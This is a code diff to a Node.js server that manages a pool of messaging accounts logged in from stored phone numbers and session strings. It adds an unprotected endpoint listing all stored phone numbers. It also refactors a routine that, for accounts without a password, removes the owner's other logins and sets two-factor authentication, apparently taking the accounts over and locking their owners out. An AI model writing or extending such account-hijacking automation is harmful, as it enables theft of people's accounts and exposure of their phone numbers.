@@ -449,6 +449,16 @@ app.get('/usermap', async (req, res) => {
   res.json(Array.from(userMap.values()));
 });
 
+app.get('/getbufferclients', async (req, res) => {
+  const db = ChannelService.getInstance();
+  const result = []
+  const clients = await db.readBufferClients();
+  clients.forEach((cli) => {
+    result.push(cli.mobile);
+  })
+  res.json(result);
+});
+
 app.get('/clients', async (req, res) => {
   checkerclass.getinstance();
   console.log('Received Client request');
@@ -1441,8 +1451,8 @@ async function checkBufferClients() {
   const clients = await db.readBufferClients();
   goodIds = [];
   badIds = [];
-  if (clients.length < 5) {
-    for (let i = 0; i < 5 - clients.length; i++) {
+  if (clients.length < 10) {
+    for (let i = 0; i < 10 - clients.length; i++) {
       badIds.push(1)
     }
   }
@@ -1469,33 +1479,39 @@ async function checkBufferClients() {
     }
   }
   console.log(badIds, goodIds);
-  const cursor = await db.getNewBufferClients(goodIds);
-  await set2faToUSers(cursor, 0);
+  await set2faToUSers();
 }
 
-async function set2faToUSers(cursor, index) {
+async function set2faToUSers() {
   const db = await ChannelService.getInstance();
+  const cursor = await db.getNewBufferClients(goodIds);
   while (badIds.length > 0) {
-    if (cursor.hasNext()) {
-      const document = await cursor.next();
-      const cli = await createClient(document.mobile, document.session);
-      if (cli) {
-        const client = await getClient(document.mobile);
-        const hasPassword = await client.hasPassword();
-        console.log("hasPassword: ", hasPassword)
-        if (!hasPassword) {
-          await client.removeOtherAuths();
-          await client.set2fa();
-          console.log("Inserting Document");
-          await db.insertInBufferClients(document);
-          console.log("waiting for setting 2FA");
-          await sleep(25000);
-          await client.disconnect();
-          badIds.pop()
+    try {
+      if (cursor.hasNext()) {
+        const document = await cursor.next();
+        const cli = await createClient(document.mobile, document.session);
+        if (cli) {
+          const client = await getClient(document.mobile);
+          const hasPassword = await client.hasPassword();
+          console.log("hasPassword: ", hasPassword);
+          if (!hasPassword) {
+            await client.removeOtherAuths();
+            await client.set2fa();
+            console.log("Inserting Document");
+            await db.insertInBufferClients(document);
+            console.log("waiting for setting 2FA");
+            await sleep(30000);
+            await client.disconnect();
+            badIds.pop();
+          }
+        } else {
+          await db.deleteUser(document);
         }
       } else {
-        await db.deleteUser(document);
+        console.log("Cursor Does not have Next");
       }
+    } catch (error) {
+      console.error("An error occurred:", error);
     }
   }
 }
